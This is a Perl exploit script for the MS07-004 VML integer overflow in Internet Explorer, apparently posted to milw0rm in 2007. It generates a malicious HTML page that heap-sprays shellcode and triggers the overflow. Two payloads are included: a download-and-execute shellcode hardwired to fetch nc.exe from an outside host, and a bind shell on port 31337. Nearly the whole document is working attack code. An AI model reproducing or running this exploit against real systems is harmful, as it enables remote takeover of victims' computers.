#(c) pang0 // www.tcbilisim.org
#bug found3d by LifeAsaGeek
#thx => o.g. / chaos / sakkure / stansar / xoron
#MS07-004 VML integer overflow exploit
$html = "laz.html";
print "(c) pang0 // www.tcbilisim.org\nbug found3d by LifeAsaGeek\nMS07-004 VML integer overflow exploit\nusage: perl $0 <shell> <opt>\n",
"shell => -b bind(31337)\n-d down.exec if selc. -d u must a down addr. \n",
"exam: perl $0 -b\nexam2: perl $0 -d http://blah.com/nc.exe\n" and exit if !$ARGV[0];
#down exec
$down =
"\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03".
"\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74".
"\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E".
"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03".
"\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C".
"\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40".
"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C".
"\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC".
"\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F".
"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB".
"\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83".
"\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF".
"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF".
"$url";
#metasploit 31337 bind shell
$bind =
"\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x09".
"\x7c\xda\x38\x83\xeb\xfc\xe2\xf4\xf5\x16\x31\x75\xe1\x85\x25\xc7".
"\xf6\x1c\x51\x54\x2d\x58\x51\x7d\x35\xf7\xa6\x3d\x71\x7d\x35\xb3".
"\x46\x64\x51\x67\x29\x7d\x31\x71\x82\x48\x51\x39\xe7\x4d\x1a\xa1".
"\xa5\xf8\x1a\x4c\x0e\xbd\x10\x35\x08\xbe\x31\xcc\x32\x28\xfe\x10".
"\x7c\x99\x51\x67\x2d\x7d\x31\x5e\x82\x70\x91\xb3\x56\x60\xdb\xd3".
"\x0a\x50\x51\xb1\x65\x58\xc6\x59\xca\x4d\x01\x5c\x82\x3f\xea\xb3".
"\x49\x70\x51\x48\x15\xd1\x51\x78\x01\x22\xb2\xb6\x47\x72\x36\x68".
"\xf6\xaa\xbc\x6b\x6f\x14\xe9\x0a\x61\x0b\xa9\x0a\x56\x28\x25\xe8".
"\x61\xb7\x37\xc4\x32\x2c\x25\xee\x56\xf5\x3f\x5e\x88\x91\xd2\x3a".
"\x5c\x16\xd8\xc7\xd9\x14\x03\x31\xfc\xd1\x8d\xc7\xdf\x2f\x89\x6b".
"\x5a\x2f\x99\x6b\x4a\x2f\x25\xe8\x6f\x14\xa0\x51\x6f\x2f\x53\xd9".
"\x9c\x14\x7e\x22\x79\xbb\x8d\xc7\xdf\x16\xca\x69\x5c\x83\x0a\x50".
"\xad\xd1\xf4\xd1\x5e\x83\x0c\x6b\x5c\x83\x0a\x50\xec\x35\x5c\x71".
"\x5e\x83\x0c\x68\x5d\x28\x8f\xc7\xd9\xef\xb2\xdf\x70\xba\xa3\x6f".
"\xf6\xaa\x8f\xc7\xd9\x1a\xb0\x5c\x6f\x14\xb9\x55\x80\x99\xb0\x68".
"\x50\x55\x16\xb1\xee\x16\x9e\xb1\xeb\x4d\x1a\xcb\xa3\x82\x98\x15".
"\xf7\x3e\xf6\xab\x84\x06\xe2\x93\xa2\xd7\xb2\x4a\xf7\xcf\xcc\xc7".
"\x7c\x38\x25\xee\x52\x2b\x88\x69\x58\x2d\xb0\x39\x58\x2d\x8f\x69".
"\xf6\xac\xb2\x95\xd0\x79\x14\x6b\xf6\xaa\xb0\xc7\xf6\x4b\x25\xe8".
"\x82\x2b\x26\xbb\xcd\x18\x25\xee\x5b\x83\x0a\x50\xf9\xf6\xde\x67".
"\x5a\x83\x0c\xc7\xd9\x7c\xda\x38";
if ($ARGV[0] eq '-d'){
$shlaz = $down;$url = $ARGV[1];$url = "http://pang0.by.ru/wget/nc.exe";
print "u must start http:// or ftp://\n" and exit if !($url =~ /http|ftp/);
}
$shlaz = $bind if $ARGV[0] eq '-b';
#citation to metasploit
sub dongu {
        my $data = shift;
        my $mode = shift() || 'LE';
        my $code = '';

        my $idx = 0;

        if (length($data) % 2 != 0) {
                $data .= substr($data, -1, 1);
        }

        while ($idx < length($data) - 1) {
                my $c1 = ord(substr($data, $idx, 1));
                my $c2 = ord(substr($data, $idx+1, 1));
                if ($mode eq 'LE') {
                        $code .= sprintf('%%u%.2x%.2x', $c2, $c1);
                } else {
                        $code .= sprintf('%%u%.2x%.2x', $c1, $c2);
                }
                $idx += 2;
        }

        return $code;
}
$sh3llz = dongu($shlaz);
#_
$body = <<BODY;
<html xmlns:v="urn:schemas-microsoft-com:vml">

<head>
<object id="VMLRender"
classid="CLSID:10072CEC-8CC1-11D1-986E-00A0C955B42E">
</object>
<style>
v\\:* { behavior: url(#VMLRender); }
</style>
</head>

<body>

<SCRIPT language="javascript">
shellcode =
unescape("%u9090%u9090$sh3llz");

bigblock = unescape("%u0505%u0505");
headersize = 20;
slackspace = headersize+shellcode.length;
while (bigblock.length<slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace<0x40000) block = block+block+fillblock;
memory = new Array();
for (i=0;i<350;i++) memory[i] = block + shellcode;

</script>

<v:rect style='width:120pt;height:80pt' fillcolor="red" >
<v:recolorinfo recolorstate="t" numcolors="97612895">

<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
<v/recolorinfo>
</html>
BODY
open H,">$html" or die $! and exit;
print H $body;

# milw0rm.com [2007-01-17]
